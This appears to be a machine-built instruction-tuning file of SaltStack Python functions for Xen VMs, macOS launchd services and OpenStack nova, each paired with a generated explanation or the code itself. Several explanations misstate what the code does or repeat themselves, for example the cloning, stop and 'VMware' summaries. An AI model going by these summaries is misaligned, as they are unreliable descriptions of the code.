{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _set_static_ip(name, session, vm_):\n    '''\n    Set static IP during create() if defined\n    '''\n    ipv4_cidr = ''\n    ipv4_gw = ''\n    if 'ipv4_gw' in vm_.keys():\n        log.debug('ipv4_gw is found in keys')\n        ipv4_gw = vm_['ipv4_gw']\n    if 'ipv4_cidr' in vm_.keys():\n        log.debug('ipv4_cidr is found in keys')\n        ipv4_cidr = vm_['ipv4_cidr']\n        log.debug('attempting to set IP in instance')\n        set_vm_ip(name, ipv4_cidr, ipv4_gw, session, None)", "response": "Set static IP in the VM if it is not already set"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nwaiting for IP to be available during create", "response": "def _wait_for_ip(name, session):\n    '''\n    Wait for IP  to be available during create()\n    '''\n    start_time = datetime.now()\n    status = None\n    while status is None:\n        status = get_vm_ip(name, session)\n        if status is not None:\n            # ignore APIPA address\n            if status.startswith('169'):\n                status = None\n        check_time = datetime.now()\n        delta = check_time - start_time\n        log.debug(\n            'Waited %s seconds for %s to report ip address...',\n            delta.seconds, name\n        )\n        if delta.seconds > 180:\n            log.warning('Timeout getting IP address')\n            break\n        time.sleep(5)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nrunning XenAPI task in asynchronous mode to prevent timeouts", "response": "def _run_async_task(task=None, session=None):\n    '''\n    Run  XenAPI task in asynchronous mode to prevent timeouts\n    '''\n    if task is None or session is None:\n        return None\n    task_name = session.xenapi.task.get_name_label(task)\n    log.debug('Running %s', task_name)\n    while session.xenapi.task.get_status(task) == 'pending':\n        progress = round(session.xenapi.task.get_progress(task), 2) * 100\n        log.debug('Task progress %.2f%%', progress)\n        time.sleep(1)\n    log.debug('Cleaning up task %s', task_name)\n    session.xenapi.task.destroy(task)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _clone_vm(image=None, name=None, session=None):\n    '''\n    Create VM by cloning\n\n    This is faster and should be used if source and target are\n    in the same storage repository\n\n    '''\n    if session is None:\n        session = _get_session()\n    log.debug('Creating VM %s by cloning %s', name, image)\n    source = _get_vm(image, session)\n    task = session.xenapi.Async.VM.clone(source, name)\n    _run_async_task(task, session)", "response": "Create VM by cloning the source VM and then cloning the target VM"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _copy_vm(template=None, name=None, session=None, sr=None):\n    '''\n    Create VM by copy\n\n    This is slower and should be used if source and target are\n    NOT in the same storage repository\n\n    template = object reference\n    name = string name of new VM\n    session = object reference\n    sr = object reference\n    '''\n    if session is None:\n        session = _get_session()\n    log.debug('Creating VM %s by copying %s', name, template)\n    source = _get_vm(template, session)\n    task = session.xenapi.Async.VM.copy(source, name, sr)\n    _run_async_task(task, session)", "response": "Create VM by copying a template VM"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _provision_vm(name=None, session=None):\n    '''\n    Provision vm right after clone/copy\n    '''\n    if session is None:\n        session = _get_session()\n    log.info('Provisioning VM %s', name)\n    vm = _get_vm(name, session)\n    task = session.xenapi.Async.VM.provision(vm)\n    _run_async_task(task, session)", "response": "Provision vm right after clone or copy"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef unpause(name, call=None, session=None):\n    '''\n    UnPause a vm\n\n    .. code-block:: bash\n\n        salt-cloud -a unpause xenvm01\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'The show_instnce function must be called with -a or --action.'\n        )\n    if session is None:\n        session = _get_session()\n    log.info('Unpausing VM %s', name)\n    vm = _get_vm(name, session)\n    task = session.xenapi.Async.VM.unpause(vm)\n    _run_async_task(task, session)\n    return show_instance(name)", "response": "UnPause a vm\n\n    .. code-block:: bash\n\n        salt-cloud -a unpause xenvm01"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nresume a VM from disk", "response": "def resume(name, call=None, session=None):\n    '''\n    Resume a vm from disk\n\n    .. code-block:: bash\n\n        salt-cloud -a resume xenvm01\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'The show_instnce function must be called with -a or --action.'\n        )\n    if session is None:\n        session = _get_session()\n    log.info('Resuming VM %s', name)\n    vm = _get_vm(name, session)\n    task = session.xenapi.Async.VM.resume(vm, False, True)\n    _run_async_task(task, session)\n    return show_instance(name)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef stop(name, call=None, session=None):\n    '''\n    Stop a vm\n\n    .. code-block:: bash\n\n        salt-cloud -a stop xenvm01\n\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'The show_instnce function must be called with -a or --action.'\n        )\n    return shutdown(name, call, session)", "response": "Stop a VM and all its children"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_vm(name=None, session=None):\n    '''\n    Get XEN vm instance object reference\n    '''\n    if session is None:\n        session = _get_session()\n    vms = session.xenapi.VM.get_by_name_label(name)\n    if len(vms) == 1:\n        return vms[0]\n    return None", "response": "Get XEN vm instance object reference"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget XEN sr object reference", "response": "def _get_sr(name=None, session=None):\n    '''\n    Get XEN sr (storage repo) object reference\n    '''\n    if session is None:\n        session = _get_session()\n    srs = session.xenapi.SR.get_by_name_label(name)\n    if len(srs) == 1:\n        return srs[0]\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget XEN resource pool object reference", "response": "def _get_pool(name=None, session=None):\n    '''\n    Get XEN resource pool object reference\n    '''\n    if session is None:\n        session = _get_session()\n    pools = session.xenapi.pool.get_all()\n    for pool in pools:\n        pool_record = session.xenapi.pool.get_record(pool)\n        if name in pool_record.get('name_label'):\n            return pool\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef destroy(name=None, call=None):\n    '''\n    Destroy Xen VM or template instance\n\n    .. code-block:: bash\n\n        salt-cloud -d xenvm01\n\n    '''\n    if call == 'function':\n        raise SaltCloudSystemExit(\n            'The destroy action must be called with -d, --destroy, '\n            '-a or --action.'\n        )\n    ret = {}\n    __utils__['cloud.fire_event'](\n        'event',\n        'destroying instance',\n        'salt/cloud/{0}/destroying'.format(name),\n        args={'name': name},\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n    session = _get_session()\n    vm = _get_vm(name)\n    if vm:\n        # get vm\n        record = session.xenapi.VM.get_record(vm)\n        log.debug('power_state: %s', record['power_state'])\n        # shut down\n        if record['power_state'] != 'Halted':\n            task = session.xenapi.Async.VM.hard_shutdown(vm)\n            _run_async_task(task, session)\n\n        # destroy disk (vdi) by reading vdb on vm\n        ret['vbd'] = destroy_vm_vdis(name, session)\n        # destroy vm\n        task = session.xenapi.Async.VM.destroy(vm)\n        _run_async_task(task, session)\n        ret['destroyed'] = True\n        __utils__['cloud.fire_event'](\n            'event',\n            'destroyed instance',\n            'salt/cloud/{0}/destroyed'.format(name),\n            args={'name': name},\n            sock_dir=__opts__['sock_dir'],\n            transport=__opts__['transport']\n        )\n        if __opts__.get('update_cachedir', False) is True:\n            __utils__['cloud.delete_minion_cachedir'](\n                name,\n                __active_provider_name__.split(':')[0],\n                __opts__\n            )\n        __utils__['cloud.cachedir_index_del'](name)\n        return ret", "response": "Destroy an Xen VM or template instance."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef sr_list(call=None):\n    '''\n    Geta list of storage repositories\n\n    .. code-block:: bash\n\n        salt-cloud -f sr_list myxen\n\n    '''\n    if call != 'function':\n        raise SaltCloudSystemExit(\n            'This function must be called with -f, --function argument.'\n        )\n    ret = {}\n    session = _get_session()\n    srs = session.xenapi.SR.get_all()\n    for sr in srs:\n        sr_record = session.xenapi.SR.get_record(sr)\n        ret[sr_record['name_label']] = sr_record\n    return ret", "response": "Return a list of storage repositories"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of Xen Servers in this VMware environment", "response": "def host_list(call=None):\n    '''\n    Get a list of Xen Servers\n\n    .. code-block:: bash\n\n        salt-cloud -f host_list myxen\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            'This function must be called with -f, --function argument.'\n        )\n    ret = {}\n    session = _get_session()\n    hosts = session.xenapi.host.get_all()\n    for host in hosts:\n        host_record = session.xenapi.host.get_record(host)\n        ret[host_record['name_label']] = host_record\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of Resource Pools", "response": "def pool_list(call=None):\n    '''\n    Get a list of Resource Pools\n\n    .. code-block:: bash\n\n        salt-cloud -f pool_list myxen\n\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            'This function must be called with -f, --function argument.'\n        )\n    ret = {}\n    session = _get_session()\n    pools = session.xenapi.pool.get_all()\n    for pool in pools:\n        pool_record = session.xenapi.pool.get_record(pool)\n        ret[pool_record['name_label']] = pool_record\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list of Resource Pools", "response": "def pif_list(call=None):\n    '''\n    Get a list of Resource Pools\n\n    .. code-block:: bash\n\n        salt-cloud -f pool_list myxen\n    '''\n    if call != 'function':\n        raise SaltCloudSystemExit(\n            'This function must be called with -f, --function argument.'\n        )\n    ret = {}\n    session = _get_session()\n    pifs = session.xenapi.PIF.get_all()\n    for pif in pifs:\n        record = session.xenapi.PIF.get_record(pif)\n        ret[record['uuid']] = record\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef vif_list(name, call=None, kwargs=None):\n    '''\n    Get a list of virtual network interfaces  on a VM\n\n    **requires**: the name of the vm with the vbd definition\n\n    .. code-block:: bash\n\n        salt-cloud -a vif_list xenvm01\n\n    '''\n    if call == 'function':\n        raise SaltCloudSystemExit(\n            'This function must be called with -a, --action argument.'\n        )\n    if name is None:\n        return 'A name kwarg is rquired'\n    ret = {}\n    data = {}\n    session = _get_session()\n    vm = _get_vm(name)\n    vifs = session.xenapi.VM.get_VIFs(vm)\n    if vifs is not None:\n        x = 0\n        for vif in vifs:\n            vif_record = session.xenapi.VIF.get_record(vif)\n            data['vif-{}'.format(x)] = vif_record\n            x += 1\n    ret[name] = data\n    return ret", "response": "Return a list of virtual network interfaces on a VM"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of VBDs on a VM", "response": "def vbd_list(name=None, call=None):\n    '''\n    Get a list of VBDs on a VM\n\n    **requires**: the name of the vm with the vbd definition\n\n    .. code-block:: bash\n\n        salt-cloud -a vbd_list xenvm01\n\n    '''\n    if call == 'function':\n        raise SaltCloudSystemExit(\n            'This function must be called with -a, --action argument.'\n        )\n    if name is None:\n        return 'A name kwarg is rquired'\n    ret = {}\n    data = {}\n    session = _get_session()\n    vms = session.xenapi.VM.get_by_name_label(name)\n    if len(vms) == 1:\n        vm = vms[0]\n        vbds = session.xenapi.VM.get_VBDs(vm)\n        if vbds is not None:\n            x = 0\n            for vbd in vbds:\n                vbd_record = session.xenapi.VBD.get_record(vbd)\n                data['vbd-{}'.format(x)] = vbd_record\n                x += 1\n    ret = data\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef destroy_vm_vdis(name=None, session=None, call=None):\n    '''\n    Get virtual block devices on VM\n\n    .. code-block:: bash\n\n        salt-cloud -a destroy_vm_vdis  xenvm01\n\n    '''\n    if session is None:\n        session = _get_session()\n    ret = {}\n    # get vm object\n    vms = session.xenapi.VM.get_by_name_label(name)\n    if len(vms) == 1:\n        # read virtual block device (vdb)\n        vbds = session.xenapi.VM.get_VBDs(vms[0])\n        if vbds is not None:\n            x = 0\n            for vbd in vbds:\n                vbd_record = session.xenapi.VBD.get_record(vbd)\n                if vbd_record['VDI'] != 'OpaqueRef:NULL':\n                    # read vdi on vdb\n                    vdi_record = session.xenapi.VDI.get_record(\n                        vbd_record['VDI'])\n                    if 'iso' not in vdi_record['name_label']:\n                        session.xenapi.VDI.destroy(vbd_record['VDI'])\n                        ret['vdi-{}'.format(x)] = vdi_record['name_label']\n                x += 1\n    return ret", "response": "Destroy virtual block devices on VM\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndestroys a specific Xen VM or template instance.", "response": "def destroy_template(name=None, call=None, kwargs=None):\n    '''\n    Destroy Xen VM or template instance\n\n        .. code-block:: bash\n\n            salt-cloud -f destroy_template myxen name=testvm2\n\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            'The destroy_template function must be called with  -f.'\n        )\n    if kwargs is None:\n        kwargs = {}\n    name = kwargs.get('name', None)\n    session = _get_session()\n    vms = session.xenapi.VM.get_all_records()\n    ret = {}\n    found = False\n    for vm in vms:\n        record = session.xenapi.VM.get_record(vm)\n        if record['is_a_template']:\n            if record['name_label'] == name:\n                found = True\n                # log.debug(record['name_label'])\n                session.xenapi.VM.destroy(vm)\n                ret[name] = {'status': 'destroyed'}\n    if not found:\n        ret[name] = {'status': 'not found'}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the PV arguments for a VM", "response": "def get_pv_args(name, session=None, call=None):\n    '''\n    Get PV arguments for a VM\n\n    .. code-block:: bash\n\n        salt-cloud -a get_pv_args xenvm01\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'This function must be called with -a or --action.'\n        )\n    if session is None:\n        log.debug('New session being created')\n        session = _get_session()\n    vm = _get_vm(name, session=session)\n    pv_args = session.xenapi.VM.get_PV_args(vm)\n    if pv_args:\n        return pv_args\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_pv_args(name, kwargs=None, session=None, call=None):\n    '''\n    Set PV arguments for a VM\n\n    .. code-block:: bash\n\n        salt-cloud -a set_pv_args xenvm01 pv_args=\"utf-8 graphical\"\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'This function must be called with -a or --action.'\n        )\n    if session is None:\n        log.debug('New session being created')\n        session = _get_session()\n    vm = _get_vm(name, session=session)\n    try:\n        log.debug('Setting PV Args: %s', kwargs['pv_args'])\n        session.xenapi.VM.set_PV_args(vm, str(kwargs['pv_args']))\n    except KeyError:\n        log.error('No pv_args parameter found.')\n        return False\n    except XenAPI.Failure:\n        log.info('Setting PV Args failed.')\n        return False\n    return True", "response": "Set PV arguments for a VM"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _name_in_services(name, services):\n    '''\n    Checks to see if the given service is in the given services.\n\n    :param str name: Service label, file name, or full path\n\n    :param dict services: The currently available services.\n\n    :return: The service information for the service, otherwise\n    an empty dictionary\n\n    :rtype: dict\n    '''\n    if name in services:\n        # Match on label\n        return services[name]\n\n    for service in six.itervalues(services):\n        if service['file_path'].lower() == name:\n            # Match on full path\n            return service\n        basename, ext = os.path.splitext(service['file_name'])\n        if basename.lower() == name:\n            # Match on basename\n            return service\n\n    return dict()", "response": "Checks to see if the given service is in the given services."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget information about a service.", "response": "def _get_service(name):\n    '''\n    Get information about a service.  If the service is not found, raise an\n    error\n\n    :param str name: Service label, file name, or full path\n\n    :return: The service information for the service, otherwise an Error\n    :rtype: dict\n    '''\n    services = __utils__['mac_utils.available_services']()\n    name = name.lower()\n\n    service = _name_in_services(name, services)\n\n    # if we would the service we can return it\n    if service:\n        return service\n\n    # if we got here our service is not available, now we can check to see if\n    # we received a cached batch of services, if not we did a fresh check\n    # so we need to raise that the service could not be found.\n    try:\n        if not __context__['using_cached_services']:\n            raise CommandExecutionError('Service not found: {0}'.format(name))\n    except KeyError:\n        pass\n\n    # we used a cached version to check, a service could have been made\n    # between now and then, we should refresh our available services.\n    services = __utils__['mac_utils.available_services'](refresh=True)\n\n    # check to see if we found the service we are looking for.\n    service = _name_in_services(name, services)\n\n    if not service:\n        # Could not find the service after refresh raise.\n        raise CommandExecutionError('Service not found: {0}'.format(name))\n\n    # found it :)\n    return service"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _always_running_service(name):\n    '''\n    Check if the service should always be running based on the KeepAlive Key\n    in the service plist.\n\n    :param str name: Service label, file name, or full path\n\n    :return: True if the KeepAlive key is set to True, False if set to False or\n        not set in the plist at all.\n\n    :rtype: bool\n\n    .. versionadded:: 2019.2.0\n    '''\n\n    # get all the info from the launchctl service\n    service_info = show(name)\n\n    # get the value for the KeepAlive key in service plist\n    try:\n        keep_alive = service_info['plist']['KeepAlive']\n    except KeyError:\n        return False\n\n    # check if KeepAlive is True and not just set.\n\n    if isinstance(keep_alive, dict):\n        # check for pathstate\n        for _file, value in six.iteritems(keep_alive.get('PathState', {})):\n            if value is True and os.path.exists(_file):\n                return True\n            elif value is False and not os.path.exists(_file):\n                return True\n\n    if keep_alive is True:\n        return True\n\n    return False", "response": "Check if the service should always be running based on the KeepAlive key in the service plist."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_domain_target(name, service_target=False):\n    '''\n    Returns the domain/service target and path for a service. This is used to\n    determine whether or not a service should be loaded in a user space or\n    system space.\n\n    :param str name: Service label, file name, or full path\n\n    :param bool service_target: Whether to return a full\n    service target. This is needed for the enable and disable\n    subcommands of /bin/launchctl. Defaults to False\n\n    :return: Tuple of the domain/service target and the path to the service.\n\n    :rtype: tuple\n\n    .. versionadded:: 2019.2.0\n    '''\n\n    # Get service information\n    service = _get_service(name)\n\n    # get the path to the service\n    path = service['file_path']\n\n    # most of the time we'll be at the system level.\n    domain_target = 'system'\n\n    # check if a LaunchAgent as we should treat these differently.\n    if 'LaunchAgents' in path:\n        # Get the console user so we can service in the correct session\n        uid = __utils__['mac_utils.console_user']()\n        domain_target = 'gui/{}'.format(uid)\n\n    # check to see if we need to make it a full service target.\n    if service_target is True:\n        domain_target = '{}/{}'.format(domain_target, service['plist']['Label'])\n\n    return (domain_target, path)", "response": "Returns the domain target and path for a service."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list_(name=None, runas=None):\n    '''\n    Run launchctl list and return the output\n\n    :param str name: The name of the service to list\n\n    :param str runas: User to run launchctl commands\n\n    :return: If a name is passed returns information about the named service,\n        otherwise returns a list of all services and pids\n    :rtype: str\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.list\n        salt '*' service.list org.cups.cupsd\n    '''\n    if name:\n        # Get service information and label\n        service = _get_service(name)\n        label = service['plist']['Label']\n\n        # we can assume if we are trying to list a LaunchAgent we need\n        # to run as a user, if not provided, we'll use the console user.\n        if not runas and _launch_agent(name):\n            runas = __utils__['mac_utils.console_user'](username=True)\n\n        # Collect information on service: will raise an error if it fails\n        return launchctl('list',\n                         label,\n                         return_stdout=True,\n                         runas=runas)\n\n    # Collect information on all services: will raise an error if it fails\n    return launchctl('list',\n                     return_stdout=True,\n                     runas=runas)", "response": "List the services and pids of a service."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef enable(name, runas=None):\n    '''\n    Enable a launchd service. Raises an error if the service fails to be enabled\n\n    :param str name: Service label, file name, or full path\n\n    :param str runas: User to run launchctl commands\n\n    :return: ``True`` if successful or if the service is already enabled\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.enable org.cups.cupsd\n    '''\n    # Get the domain target. enable requires a full <service-target>\n    service_target = _get_domain_target(name, service_target=True)[0]\n\n    # Enable the service: will raise an error if it fails\n    return launchctl('enable', service_target, runas=runas)", "response": "Enable a launchd service."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef disable(name, runas=None):\n    '''\n    Disable a launchd service. Raises an error if the service fails to be\n    disabled\n\n    :param str name: Service label, file name, or full path\n\n    :param str runas: User to run launchctl commands\n\n    :return: ``True`` if successful or if the service is already disabled\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.disable org.cups.cupsd\n    '''\n    # Get the service target. enable requires a full <service-target>\n    service_target = _get_domain_target(name, service_target=True)[0]\n\n    # disable the service: will raise an error if it fails\n    return launchctl('disable', service_target, runas=runas)", "response": "Disable a launchd service."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nstarts a launchd service.", "response": "def start(name, runas=None):\n    '''\n    Start a launchd service.  Raises an error if the service fails to start\n\n    .. note::\n        To start a service in macOS the service must be enabled first. Use\n        ``service.enable`` to enable the service.\n\n    :param str name: Service label, file name, or full path\n\n    :param str runas: User to run launchctl commands\n\n    :return: ``True`` if successful or if the service is already running\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.start org.cups.cupsd\n    '''\n    # Get the domain target.\n    domain_target, path = _get_domain_target(name)\n\n    # Load (bootstrap) the service: will raise an error if it fails\n    return launchctl('bootstrap', domain_target, path, runas=runas)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nstopping a launchd service.", "response": "def stop(name, runas=None):\n    '''\n    Stop a launchd service.  Raises an error if the service fails to stop\n\n    .. note::\n        Though ``service.stop`` will unload a service in macOS, the service\n        will start on next boot unless it is disabled. Use ``service.disable``\n        to disable the service\n\n    :param str name: Service label, file name, or full path\n\n    :param str runas: User to run launchctl commands\n\n    :return: ``True`` if successful or if the service is already stopped\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.stop org.cups.cupsd\n    '''\n    # Get the domain target.\n    domain_target, path = _get_domain_target(name)\n\n    # Stop (bootout) the service: will raise an error if it fails\n    return launchctl('bootout', domain_target, path, runas=runas)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef restart(name, runas=None):\n    '''\n    Unloads and reloads a launchd service.  Raises an error if the service\n    fails to reload\n\n    :param str name: Service label, file name, or full path\n\n    :param str runas: User to run launchctl commands\n\n    :return: ``True`` if successful\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.restart org.cups.cupsd\n    '''\n    # Restart the service: will raise an error if it fails\n    if enabled(name):\n        stop(name, runas=runas)\n    start(name, runas=runas)\n\n    return True", "response": "Unloads and reloads a launchd service."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef status(name, sig=None, runas=None):\n    '''\n    Return the status for a service.\n\n    :param str name: Used to find the service from launchctl.  Can be any part\n        of the service name or a regex expression.\n\n    :param str sig: Find the service with status.pid instead.  Note that\n        ``name`` must still be provided.\n\n    :param str runas: User to run launchctl commands\n\n    :return: The PID for the service if it is running, or 'loaded' if the\n        service should not always have a PID, or otherwise an empty string\n\n    :rtype: str\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.status cups\n    '''\n    # Find service with ps\n    if sig:\n        return __salt__['status.pid'](sig)\n\n    try:\n        _get_service(name)\n    except CommandExecutionError as msg:\n        log.error(msg)\n        return ''\n\n    if not runas and _launch_agent(name):\n        runas = __utils__['mac_utils.console_user'](username=True)\n\n    output = list_(runas=runas)\n\n    # Used a string here instead of a list because that's what the linux version\n    # of this module does\n    pids = ''\n    for line in output.splitlines():\n        if 'PID' in line:\n            continue\n        if re.search(name, line.split()[-1]):\n            if line.split()[0].isdigit():\n                if pids:\n                    pids += '\\n'\n                pids += line.split()[0]\n\n    # mac services are a little different than other platforms as they may be\n    # set to run on intervals and may not always active with a PID. This will\n    # return a string 'loaded' if it shouldn't always be running and is enabled.\n    if not _always_running_service(name) and enabled(name) and not pids:\n        return 'loaded'\n\n    return pids", "response": "Return the status of a service."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck if the specified service is enabled", "response": "def enabled(name, runas=None):\n    '''\n    Check if the specified service is enabled\n\n    :param str name: The name of the service to look up\n\n    :param str runas: User to run launchctl commands\n\n    :return: True if the specified service enabled, otherwise False\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.enabled org.cups.cupsd\n    '''\n    # Try to list the service.  If it can't be listed, it's not enabled\n    try:\n        list_(name=name, runas=runas)\n        return True\n    except CommandExecutionError:\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef disabled(name, runas=None, domain='system'):\n    '''\n    Check if the specified service is not enabled. This is the opposite of\n    ``service.enabled``\n\n    :param str name: The name to look up\n\n    :param str runas: User to run launchctl commands\n\n    :param str domain: domain to check for disabled services. Default is system.\n\n    :return: True if the specified service is NOT enabled, otherwise False\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.disabled org.cups.cupsd\n    '''\n\n    disabled = launchctl('print-disabled',\n                         domain,\n                         return_stdout=True,\n                         runas=runas)\n    for service in disabled.split(\"\\n\"):\n        if name in service:\n            srv_name = service.split(\"=>\")[0].split(\"\\\"\")[1]\n            status = service.split(\"=>\")[1]\n            if name != srv_name:\n                pass\n            else:\n                return True if 'true' in status.lower() else False\n\n    return False", "response": "Check if the specified service is disabled."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_all(runas=None):\n    '''\n    Return a list of services that are enabled or available. Can be used to\n    find the name of a service.\n\n    :param str runas: User to run launchctl commands\n\n    :return: A list of all the services available or enabled\n    :rtype: list\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.get_all\n    '''\n    # Get list of enabled services\n    enabled = get_enabled(runas=runas)\n\n    # Get list of all services\n    available = list(__utils__['mac_utils.available_services']().keys())\n\n    # Return composite list\n    return sorted(set(enabled + available))", "response": "Return a list of all services that are enabled or available. Can be used to get a list of services that are enabled or available. Can be used to get a list of services that are enabled or available."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_enabled(runas=None):\n    '''\n    Return a list of all services that are enabled. Can be used to find the\n    name of a service.\n\n    :param str runas: User to run launchctl commands\n\n    :return: A list of all the services enabled on the system\n    :rtype: list\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' service.get_enabled\n    '''\n    # Collect list of enabled services\n    stdout = list_(runas=runas)\n    service_lines = [line for line in stdout.splitlines()]\n\n    # Construct list of enabled services\n    enabled = []\n    for line in service_lines:\n        # Skip header line\n        if line.startswith('PID'):\n            continue\n\n        pid, status, label = line.split('\\t')\n        enabled.append(label)\n\n    return sorted(set(enabled))", "response": "Return a list of all services that are enabled on the system"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a conn object for the passed VM data", "response": "def get_conn():\n    '''\n    Return a conn object for the passed VM data\n    '''\n    vm_ = get_configured_provider()\n\n    kwargs = vm_.copy()  # pylint: disable=E1103\n\n    kwargs['username'] = vm_['user']\n    kwargs['project_id'] = vm_['tenant']\n    kwargs['auth_url'] = vm_['identity_url']\n    kwargs['region_name'] = vm_['compute_region']\n    kwargs['use_keystoneauth'] = vm_.get('use_keystoneauth', False)\n\n    if 'password' in vm_:\n        kwargs['password'] = vm_['password']\n\n    if 'verify' in vm_ and vm_['use_keystoneauth'] is True:\n        kwargs['verify'] = vm_['verify']\n    elif 'verify' in vm_ and vm_['use_keystoneauth'] is False:\n        log.warning('SSL Certificate verification option is specified but use_keystoneauth is False or not present')\n    conn = nova.SaltNova(**kwargs)\n\n    return conn"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of locations for the resource in the cloud provider", "response": "def avail_locations(conn=None, call=None):\n    '''\n    Return a list of locations\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            'The avail_locations function must be called with '\n            '-f or --function, or with the --list-locations option'\n        )\n\n    if conn is None:\n        conn = get_conn()\n\n    endpoints = nova.get_entry(conn.get_catalog(), 'type', 'compute')['endpoints']\n    ret = {}\n    for endpoint in endpoints:\n        ret[endpoint['region']] = endpoint\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_image(conn, vm_):\n    '''\n    Return the image object to use\n    '''\n    vm_image = config.get_cloud_config_value('image', vm_, __opts__, default='').encode(\n        'ascii', 'salt-cloud-force-ascii'\n    )\n    if not vm_image:\n        log.debug('No image set, must be boot from volume')\n        return None\n\n    image_list = conn.image_list()\n\n    for img in image_list:\n        if vm_image in (image_list[img]['id'], img):\n            return image_list[img]['id']\n\n    try:\n        image = conn.image_show(vm_image)\n        return image['id']\n    except novaclient.exceptions.NotFound as exc:\n        raise SaltCloudNotFound(\n            'The specified image, \\'{0}\\', could not be found: {1}'.format(\n                vm_image,\n                exc\n            )\n        )", "response": "Return the image object to use"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nshows the details from the provider concerning an instance", "response": "def show_instance(name, call=None):\n    '''\n    Show the details from the provider concerning an instance\n    '''\n    if call != 'action':\n        raise SaltCloudSystemExit(\n            'The show_instance action must be called with -a or --action.'\n        )\n\n    conn = get_conn()\n    node = conn.show_instance(name).__dict__\n    __utils__['cloud.cache_node'](node, __active_provider_name__, __opts__)\n    return node"}
